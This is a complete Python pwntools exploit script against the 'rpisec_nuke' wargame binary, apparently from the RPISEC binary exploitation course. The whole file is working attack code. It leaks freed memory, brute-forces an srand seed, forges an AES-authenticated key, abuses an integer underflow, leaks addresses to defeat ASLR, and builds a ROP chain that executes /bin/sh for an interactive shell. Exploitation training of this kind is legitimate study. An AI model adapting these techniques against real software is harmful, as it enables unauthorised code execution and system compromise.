from pwn import *
import ctypes
from Crypto.Cipher import AES

r = remote("172.16.37.128", 31337)

SYSTEM_OFFSET = 0x40190
BINSH_OFFSET = 0x160a24

# get session in order to calculate seed
r.recvuntil("LAUNCH SESSION ")
session = int(r.recvn(26)[16:])
log.info("session: {}".format(hex(session)))

# overwrite freed chunk
r.sendline("3")
r.send("\n\n")

r.sendline("2")
r.sendline("41" * 16)
r.sendline("32")
r.sendafter("ENTER DATA TO ENCRYPT: ", "A" * 32)
r.send("\n")

# leak modified key2 using use after free
r.sendline("3")
r.recvuntil("CHALLENGE (64 Bytes):\n")

challenge = ""
for i in range(4):
    challenge += (r.recvline()[-48:-1]).replace(".", "") 

challenge = [challenge[byte:byte+2] for byte in range(0, len(challenge), 2)] 
challenge = "".join([chr(int(element, 16)) for element in challenge])

# get current EPOCH time to calculate seed
r.recvuntil("TIME NOW: ")
time_now = int(r.recvline()[7:17])
r.send("\n\n")

# calculate seed
libc = ctypes.cdll.LoadLibrary("libc.so.6")
first = u32(challenge[0:4])
first = first ^ 0x41414141

for seed in range(session + time_now - 60, session + time_now + 1):
    libc.srand(seed & 0xFFFFFFFF)
    rando = libc.rand()

    if first == rando:
        break
    elif seed == session + time_now:
        exit()

# calculate key2 and overflow in win variable of key3
libc.srand(seed & 0xFFFFFFFF)
[libc.rand() for i in range(12)]

key2 = ''.join([p32(u32(challenge[i:i+4]) ^ libc.rand()) for i in range(48, 64, 4)])
IV = ('CFFAEDFEDEC0ADDEFECABEBA0BB0550A').decode('hex')
aes = AES.new(key2, AES.MODE_CBC, IV)
part1 = (aes.encrypt("KING CROWELL" + "\x00" * 4)).encode("hex")
auth_data = (part1 + "371303" + "00" * 13).decode("hex")
part2 = aes.decrypt(auth_data)[16:]

r.sendline("2")
r.sendline(key2.encode("hex"))
r.sendline("32")
r.sendafter("ENTER DATA TO ENCRYPT: ", "KING CROWELL" + "\x00" * 4 + part2)
r.send("\n")

r.sendline("3")
r.send("\n\n")

# key1 integer underflow
r.sendline("1")
r.sendline("\x00")
r.send("\n")

# nuke programming
r.sendline("4")

'''
Detonate nuke on GENERAL DOOM
47 45 4e 45 52 41 4c 20 44 4f 4f 4d

r.sendline("41414141" + "04000000" + "A86D9C94" + "53474900" + "53454900" + "534e4900" + "53454900" + "53524900" + "53414900" + "534C4900" + "53204900" + "53444900" + "534f4900" + "534f4900" + "534D4900" + "444F4F4D") # Denotate on "GENERAL DOOM"   0x050f0445 
'''

# leak address of disarm_nuke
r.sendline("41414141" + "04000000" + "EC5DD3C2" + "49" * 128 + "4F494F494F494F52")
r.send("\n")
r.sendline("confirm")

disarm_nuke = []
for i in range(4):
    r.recvuntil("CYBER NUKE TARGETING STATUS: ")
    r.recvn(9)
    disarm_nuke.append(r.recvn(2))

disarm_nuke = ''.join(disarm_nuke[::-1])
disarm_nuke = int(disarm_nuke, 16)
log.info("disarm_nuke addr: {}".format(hex(disarm_nuke)))

# calculate base addresses of libc and elf
elf = ELF("/levels/project2/rpisec_nuke")
elf.address = disarm_nuke - elf.symbols["disarm_nuke"]
log.info("ELF base address: {}".format(hex(elf.address)))
libc_addr = disarm_nuke - 0x1e6021
log.info("libc base address: {}".format(hex(libc_addr)))

'''
Call system() like a PLEB
2f 2f 62 69 6e 2f 73 68 //bin/sh

system = libc_addr + SYSTEM_OFFSET
log.info("system: {}".format(hex(system)))
system = [char.encode("hex") for char in p32(system)]

nuke = "532f4900" + "532f4900" + "53624900" + "53694900" + "536e4900" + "532f4900" + "53734900" + "53684900" + "53004900" + "53004900" + "53004900" + "53004900" + "49" * 120 + "53" + system[0] + "4900" + "53" + system[1] + "4900" + "53" + system[2] + "4900" + "53" + system[3] + "4900" + "444F4F4D"
'''

# gadgets
binsh_string = [char.encode("hex") for char in p32(libc_addr + BINSH_OFFSET)]
mov_esp_edx = [char.encode("hex") for char in p32(elf.address + 0x00002cd4)]
pop_ecx_eax = [char.encode("hex") for char in p32(libc_addr + 0x000ef750)]
pop_ebx = [char.encode("hex") for char in p32(libc_addr + 0x000198ce)]
pop_edx = [char.encode("hex") for char in p32(libc_addr + 0x00001aa2)]
int_0x80 = [char.encode("hex") for char in p32(libc_addr + 0x0002e6a5)]

nuke = []
eax = ["0B", "00", "00", "00"]
ecx_edx = ["00", "00", "00", "00"]

# reprogramming in order to rop
nuke += ["53" + element + "4900" for element in pop_ecx_eax]
nuke += ["53" + element + "4900" for element in ecx_edx]
nuke += ["53" + element + "4900" for element in eax]
nuke += ["53" + element + "4900" for element in pop_ebx]
nuke += ["53" + element + "4900" for element in binsh_string]
nuke += ["53" + element + "4900" for element in pop_edx]
nuke += ["53" + element + "4900" for element in ecx_edx]
nuke += ["53" + element + "4900" for element in int_0x80]

nuke = ''.join(nuke)
nuke += "49" * (0x28c - 0x208 - 32)
nuke += "53" + mov_esp_edx[0] + "4900" + "53" + mov_esp_edx[1] + "4900" + "53" + mov_esp_edx[2] + "4900" + "53" + mov_esp_edx[3] + "4900" + "444F4F4D" 


checksumStabilizer = 0x050f0445
for i in range(0, len(nuke), 8):
    checksumStabilizer ^= u32((nuke[i:i+8]).decode("hex"))
checksumStabilizer = (p32(checksumStabilizer ^ 0xdcdc59a9)).encode("hex")

r.sendline("41414141" + "04000000" + checksumStabilizer + nuke)
r.send("\n")

r.interactive()
